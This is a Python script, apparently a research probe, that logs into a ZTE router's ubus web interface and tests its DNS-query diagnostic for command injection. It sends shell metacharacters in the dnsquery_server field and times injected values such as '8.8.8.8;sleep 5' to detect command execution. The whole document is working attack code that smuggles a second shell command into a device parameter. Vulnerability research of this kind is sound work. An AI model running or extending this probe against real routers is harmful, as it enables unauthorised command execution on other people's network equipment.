#!/usr/bin/env python3
"""DNS-query diag injection probe. ROUTER_PW env.
dnsquery_server is a second input -> test for command injection."""
import os, json, time, hashlib, urllib.request, http.cookiejar

GW=os.environ.get("GW","192.168.0.1"); PW=os.environ["ROUTER_PW"]; ANON="0"*32
_J=http.cookiejar.CookieJar(); OP=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(_J))
def post(pl):
    req=urllib.request.Request(f"http://{GW}/ubus/?t={int(time.time()*1000)}",data=json.dumps(pl).encode(),
        headers={"Content-Type":"application/json","Accept":"*/*","User-Agent":"Mozilla/5.0",
        "Origin":f"http://{GW}/","Referer":f"http://{GW}/","Z-Mode":"1"})
    try:
        with OP.open(req,timeout=40) as r: return json.loads(r.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except: return [{"error":{"code":e.code}}]
def call(s,o,m,p=None):
    for _ in range(3):
        r=post([{"jsonrpc":"2.0","id":1,"method":"call","params":[s,o,m,p or {}]}])[0]
        if not (isinstance(r,dict) and r.get("error",{}).get("code")==400): return r
        time.sleep(0.2)
    return r
def get(path):
    req=urllib.request.Request(f"http://{GW}/{path}",headers={"User-Agent":"Mozilla/5.0","Referer":f"http://{GW}/"})
    try:
        with OP.open(req,timeout=15) as r: return r.getcode(), r.read().decode(errors="replace")
    except Exception as e: return 0, str(e)
def sha(s): return hashlib.sha256(s.encode()).hexdigest().upper()
def code(r):
    if "error" in r: return f"E{r['error'].get('code')}"
    res=r.get("result"); return res[0] if res else "?"
def body(r):
    res=r.get("result"); return json.dumps(res[1])[:160] if res and len(res)>1 else ""

salt=call(ANON,"zwrt_web","web_login_info",{})["result"][1]["zte_web_sault"]
s=call(ANON,"zwrt_web","web_login",{"password":sha(sha(PW)+salt)})["result"][1]["ubus_rpc_session"]
print("session",s[:8])

print("\n=== baseline: dnsquery google.com @8.8.8.8 ===")
call(s,"zwrt_router.api","router_set_dnsquery_diagnose",{"dnsquery_target":"google.com","dnsquery_action":"check","dnsquery_server":"8.8.8.8"})
time.sleep(3)
print("result:", body(call(s,"zwrt_router.api","router_get_dnsquery_diag_result",{})))

print("\n=== /log/ output channels for DNS ===")
for p in ["log/DnsQueryMessages","log/DnsqueryMessages","log/DNSMessages","log/DiagnosisMessages","log/ModemlogMessages","log/SyslogMessages","log/TcpdumpMessages"]:
    c,b=get(p); print(f"  /{p} [{c}] {b[:80]!r}")

print("\n=== dnsquery_server charset probe (0=accepted) ===")
for c in list(";|&`$() <>\n\t'\"\\*?,#@!^~%+=:/"):
    srv="8.8.8.8"+c+"x"
    r=call(s,"zwrt_router.api","router_set_dnsquery_diagnose",{"dnsquery_target":"g.com","dnsquery_action":"check","dnsquery_server":srv})
    cc=code(r)
    if cc==0: print(f"  {c!r:6} ACCEPTED")

print("\n=== time-based injection test (server with sleep) ===")
for srv,label in [("8.8.8.8","baseline"),("8.8.8.8;sleep 5","semi-sleep"),("8.8.8.8|sleep 5","pipe-sleep"),("8.8.8.8&&sleep 5","and-sleep")]:
    t0=time.time()
    r=call(s,"zwrt_router.api","router_set_dnsquery_diagnose",{"dnsquery_target":"g.com","dnsquery_action":"check","dnsquery_server":srv})
    dt=time.time()-t0
    print(f"  {label:14} -> set[{code(r)}] {dt:.2f}s")
    time.sleep(0.5)
